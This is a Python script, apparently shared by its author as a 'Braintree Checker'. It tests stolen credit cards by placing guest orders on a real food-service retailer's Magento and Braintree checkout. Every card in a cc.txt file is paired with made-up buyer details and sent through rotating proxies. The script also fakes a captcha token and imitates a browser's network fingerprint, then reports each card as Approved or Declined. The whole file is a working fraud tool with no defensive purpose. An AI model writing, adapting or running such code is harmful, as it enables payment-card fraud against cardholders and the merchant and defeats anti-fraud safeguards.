
# //@wortexbabax

import subprocess, sys

# //@wortexbabax 
MODULES = ["curl_cffi", "colorama"]
for mod in MODULES:
    try:
        __import__(mod)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", mod, "-q"])

import json, time, random, string, uuid, base64, xml.etree.ElementTree as ET
from colorama import init, Fore
import curl_cffi.requests as requests

init(autoreset=True)
G = Fore.GREEN
R = Fore.RED
X = Fore.RESET
Y = Fore.YELLOW

# //@wortexbabax 
use_proxy = "--proxy" in sys.argv
proxies_list = []
proxy_idx = 0

def load_proxies():
    global proxies_list
    try:
        with open('proxys.txt', 'r', encoding='utf-8-sig') as f:
            for line in f:
                line = line.strip()
                if ':' in line and not line.startswith('#'):
                    p = line.split(':')
                    if len(p) == 4:
                        proxies_list.append({"http": f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}", "https": f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"})
    except: pass
    try:
        try:
            with open('cc.txt', 'r', encoding='utf-8-sig') as f:
                lines = [l.strip() for l in f if l.strip() and not l.startswith('#')]
        except:
            with open('cc.txt', 'r', encoding='utf-16') as f:
                lines = [l.strip() for l in f if l.strip() and not l.startswith('#')]
        for line in lines:
            p = line.split(':')
            if len(p) == 4 and p[0].replace('.','').isdigit() and p[1].isdigit() and int(p[1]) > 9999:
                proxies_list.append({"http": f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}", "https": f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"})
    except: pass

def get_proxy():
    global proxy_idx
    if not proxies_list or not use_proxy: return None
    p = proxies_list[proxy_idx % len(proxies_list)]
    proxy_idx += 1
    return p

load_proxies()

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36"

DEVICE_INFO = {
    "ua": UA,
    "browser": {"name": "Brave", "version": "149.0.0.0", "major": "149"},
    "engine": {"name": "Blink", "version": "149.0.0.0"},
    "os": {"name": "Windows", "version": "10"},
    "device": {},
    "cpu": {"architecture": "amd64"}
}

CAPTCHA_TOKEN = base64.b64encode(b"customCapcha,mobile").decode()

# //@wortexbabax - Random data generators
def rnd_email():
    domains = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com","icloud.com","aol.com","mail.com","zoho.com","yandex.com"]
    u = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8,14)))
    return f"{u}@{random.choice(domains)}"

def rnd_name():
    f = ["James","John","Robert","Michael","William","David","Richard","Joseph","Thomas","Christopher","Daniel","Matthew","Anthony","Mark","Steven","Paul","Andrew","Joshua","Kenneth","Kevin","Brian","George","Timothy","Ronald","Edward","Jason","Jeffrey","Ryan","Jacob","Gary","Nicholas","Eric","Jonathan","Stephen","Larry","Justin","Scott","Brandon","Benjamin","Samuel","Raymond","Gregory","Frank","Alexander","Patrick","Jack","Dennis","Jerry","Tyler","Aaron"]
    l = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez","Hernandez","Lopez","Gonzalez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Martin","Lee","Perez","Thompson","White","Harris","Sanchez","Clark","Ramirez","Lewis","Robinson","Walker","Young","Allen","King","Wright","Scott","Torres","Nguyen","Hill","Flores","Green","Adams","Nelson","Baker","Hall","Rivera","Campbell","Mitchell","Carter","Roberts"]
    return random.choice(f), random.choice(l)

def rnd_addr():
    n = random.randint(100,9999)
    s = ["Main","Oak","Maple","Cedar","Pine","Elm","Walnut","Spruce","Park","Washington","Lake","Hill","Sunset","Broadway","Highland","Union","Church","River","Forest","Valley"]
    t = ["St","Ave","Blvd","Dr","Ln","Rd","Ct","Way","Pl"]
    return f"{n} {random.choice(s)} {random.choice(t)}"

def rnd_phone():
    return f"+1{random.randint(2000000000,9999999999)}"

def rnd_zip():
    zips = ["28202","28203","28204","28205","28206","28207","28208","28209","28210","28211","28212","28213","28214","28215","28216","28217"]
    return random.choice(zips)

# //@wortexbabax
def create_cart():
    try:
        r = requests.post("https://magento.foodservicedirect.com/rest/V1/guest-carts", impersonate="chrome120", headers={"User-Agent": UA}, proxies=get_proxy(), timeout=20)
        return ET.fromstring(r.text).text
    except: return None

# //@wortexbabax - Add item
def add_item(cart_id, sku="23015965"):
    try:
        r = requests.post(f"https://magento.foodservicedirect.com/rest/V1/guest-carts/{cart_id}/items", json={"cartItem": {"qty": 1, "quote_id": cart_id, "sku": sku}}, impersonate="chrome120", headers={"authorization": "Bearer undefined", "x-system-web-source": "nextjs", "User-Agent": UA}, proxies=get_proxy(), timeout=20)
        return r.status_code in [200, 201]
    except: return False

# //@wortexbabax - Braintree token
def bt_token():
    try:
        r = requests.post("https://www.foodservicedirect.com/graphql", json={"variables": {}, "query": "mutation {\n  createBraintreeClientToken\n}"}, impersonate="chrome120", headers={"authorization": "", "content-type": "application/json", "store": "default", "origin": "https://www.foodservicedirect.com", "referer": "https://www.foodservicedirect.com/checkout", "User-Agent": UA}, proxies=get_proxy(), timeout=20)
        d = json.loads(base64.urlsafe_b64decode(r.json()["data"]["createBraintreeClientToken"] + "=="))
        return d["authorizationFingerprint"], d.get("graphQL", {}).get("url", "https://payments.braintree-api.com/graphql")
    except: return None, None

# //@wortexbabax 
def tokenize(auth, url, cc, mm, yy, cvv, name, zip):
    try:
        q = """mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 expirationMonth expirationYear } } }"""
        p = {"clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": str(uuid.uuid4())}, "query": q, "variables": {"input": {"creditCard": {"number": cc, "expirationMonth": mm, "expirationYear": yy, "cvv": cvv, "cardholderName": name, "billingAddress": {"postalCode": zip}}, "options": {"validate": True}}}, "operationName": "TokenizeCreditCard"}
        r = requests.post(url, json=p, impersonate="chrome120", headers={"authorization": f"Bearer {auth}", "braintree-version": "2018-05-10", "content-type": "application/json", "origin": "https://www.foodservicedirect.com", "referer": "https://www.foodservicedirect.com/", "User-Agent": UA}, proxies=get_proxy(), timeout=20)
        d = r.json()
        if d.get("errors"): return None, d["errors"][0].get("message", "token error")
        t = d.get("data", {}).get("tokenizeCreditCard", {}).get("token")
        return (t, None) if t else (None, "no token")
    except Exception as e: return None, str(e)

# //@wortexbabax - Set shipping
def set_ship(cart_id, zip, rc, email, fn, ln, addr, phone):
    try:
        p = {"addressInformation": {"shippingAddress": {"country_id": "US", "postcode": zip, "city": "Charlotte", "company": "", "email": email, "firstname": fn, "lastname": ln, "region_code": rc, "street": [addr, ""], "telephone": phone, "sameAsBilling": 1, "saveInAddressBook": 0, "extension_attributes": {"address_type": "res"}}, "billingAddress": {"country_id": "US", "postcode": zip, "city": "Charlotte", "company": "", "email": email, "firstname": fn, "lastname": ln, "region_code": rc, "street": [addr, ""], "telephone": phone, "saveInAddressBook": 0, "extension_attributes": {"address_type": "res"}}, "shippingCarrierCode": "omsmultipleshipping", "shippingMethodCode": "omsshipping_0smo03"}}
        r = requests.post(f"https://magento.foodservicedirect.com/rest/V1/guest-carts/{cart_id}/shipping-information", json=p, impersonate="chrome120", headers={"authorization": "Bearer undefined", "x-system-web-source": "nextjs", "User-Agent": UA}, proxies=get_proxy(), timeout=20)
        return r.status_code == 200
    except: return False

# //@wortexbabax - Submit payment
def pay(cart_id, token, email):
    try:
        p = {"paymentMethod": {"method": "braintree", "additional_data": {"payment_method_nonce": token}}, "email": email, "deviceInfo": DEVICE_INFO, "group_id": "71", "googleReCaptchaClientToken": CAPTCHA_TOKEN}
        r = requests.post(f"https://magento.foodservicedirect.com/rest/V1/fsd-guest-carts/{cart_id}/payment-information", json=p, impersonate="chrome120", headers={"accept": "application/json, text/plain, */*", "authorization": "Bearer undefined", "x-system-web-source": "nextjs", "content-type": "application/json", "User-Agent": UA}, proxies=get_proxy(), timeout=20)
        try:
            d = ET.fromstring(r.text)
            m = d.find('message')
            return {"ok": False, "msg": m.text} if m is not None else {"ok": True, "msg": r.text.strip()}
        except: pass
        try:
            o = json.loads(r.text)
            return {"ok": False, "msg": o["message"]} if "message" in o else {"ok": True, "msg": r.text.strip()}
        except: pass
        return {"ok": True, "msg": r.text.strip()}
    except: return None

# //@wortexbabax 
def process(line):
    line = line.strip()
    if not line or line.startswith('#'): return
    parts = line.split('|')
    if len(parts) < 4: return
    cc = parts[0].replace(' ','').strip()
    mm = parts[1].strip().zfill(2)
    yy = parts[2].strip()
    cvv = parts[3].strip()
    if len(yy) == 2: yy = "20" + yy
    fn, ln = rnd_name()
    em = rnd_email()
    addr = rnd_addr()
    zip = rnd_zip()
    rc = "NC"
    phone = rnd_phone()
    name = f"{fn} {ln}"
    t0 = time.time()

    cart = create_cart()
    if not cart: print(f"{R}-> Declined | {line} | cart fail | {time.time()-t0:.1f}s{X}"); return
    if not add_item(cart): print(f"{R}-> Declined | {line} | add fail | {time.time()-t0:.1f}s{X}"); return
    if not set_ship(cart, zip, rc, em, fn, ln, addr, phone): print(f"{R}-> Declined | {line} | ship fail | {time.time()-t0:.1f}s{X}"); return
    auth, url = bt_token()
    if not auth: print(f"{R}-> Declined | {line} | bt fail | {time.time()-t0:.1f}s{X}"); return
    tok, err = tokenize(auth, url, cc, mm, yy, cvv, name, zip)
    if not tok: print(f"{R}-> Declined | {line} | {err} | {time.time()-t0:.1f}s{X}"); return
    res = pay(cart, tok, em)
    el = time.time() - t0
    if res and res["ok"]: print(f"{G}-> Approved | {line} | {res['msg']} | {el:.1f}s{X}")
    elif res: print(f"{R}-> Declined | {line} | {res['msg']} | {el:.1f}s{X}")
    else: print(f"{R}-> Declined | {line} | no response | {el:.1f}s{X}")

# //@wortexbabax 
if __name__ == "__main__":
    print(f"{Y}Braintree Checker | By @wortexbabax{X}")
    print(f"{Y}Proxies: {len(proxies_list)}{X}\n")

    try:
        try:
            with open('cc.txt', 'r', encoding='utf-8-sig') as f: cards = [l.strip() for l in f if l.strip() and not l.startswith('#')]
        except:
            with open('cc.txt', 'r', encoding='utf-16') as f: cards = [l.strip() for l in f if l.strip() and not l.startswith('#')]
    except: print(f"{R}cc.txt not found{X}"); sys.exit(1)

    cc_list = [l for l in cards if len(l.split('|')) >= 4 and l.split('|')[0].replace(' ','').isdigit() and len(l.split('|')[0].replace(' ','')) >= 13]
    print(f"{Y}Found {len(cc_list)} cards{X}\n")

    for c in cc_list:
        process(c)
        time.sleep(random.uniform(1, 3))
